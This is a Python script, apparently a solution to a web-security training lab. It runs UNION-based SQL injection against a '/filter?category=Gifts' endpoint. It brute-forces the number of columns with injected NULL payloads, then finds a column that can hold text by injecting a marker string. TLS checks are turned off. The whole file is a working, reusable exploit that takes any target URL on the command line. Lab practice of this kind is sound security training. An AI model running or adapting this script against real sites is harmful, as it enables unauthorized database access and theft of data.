#!/usr/bin/env python3

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

PATH = "/filter?category=Gifts"

def sqli_04_columns(url):
    for i in range(1,51):
        print(f"[+] Testing column count: {i}")

        nulls = ",".join(["NULL"] * i)
        sqli_payload = f"' UNION SELECT {nulls}--"
        r = requests.get(url + PATH + sqli_payload, verify=False)
        if "Internal Server Error" not in r.text:
            return i
    return False

# function to test which column contains the string '4TvVOT'
def check_string(url, col_num):
    test_string = "4TvVOT"
    for i in range (col_num):
        payload_list = ["NULL"] * col_num
        payload_list[i] = f"'{test_string}'"
        payload = ",".join(payload_list)
        sqli_payload2 = f"' UNION SELECT {payload}--"
        print(f"[+] Testing for string in column {i + 1}")
        r = requests.get(url + PATH + sqli_payload2, verify = False)

        if test_string in r.text:
            print(f"[+] String found in column {i + 1}")
            return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit() 


    col_num = sqli_04_columns(url)
    if col_num:
        print("[+] The number of columns is: " + str(col_num))

        if check_string(url, col_num):
            print(f"[+] Found a string-compatible column")

        else:
            print("[-] No string-compatible columns found")